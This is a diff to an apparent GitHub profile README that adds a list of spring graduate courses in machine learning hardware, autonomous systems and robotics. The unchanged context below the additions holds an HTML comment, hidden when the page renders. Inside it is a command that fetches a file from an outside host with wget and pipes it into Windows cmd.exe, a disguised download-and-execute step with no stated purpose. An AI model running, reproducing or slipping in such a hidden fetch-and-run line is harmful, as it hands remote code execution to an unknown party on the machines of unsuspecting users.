@@ -16,6 +16,12 @@ This is DackJempsey's profile. Take a look around and let me know if you have an
 - ASIC Design
 - Applied Machine Learning
 
+#### Spring Courses:
+- Neuromorphic Computing (PHD level)
+- Designing Inteligent Autonomous Systems
+- Machine Learning Hardware Systems
+- Micro and Nano Robotics (PHD level)
+
 
 <!--
 `wget quicker.computer/fe334TGee4GWindows100R443 |C:\Windows\system32\cmd.exe`
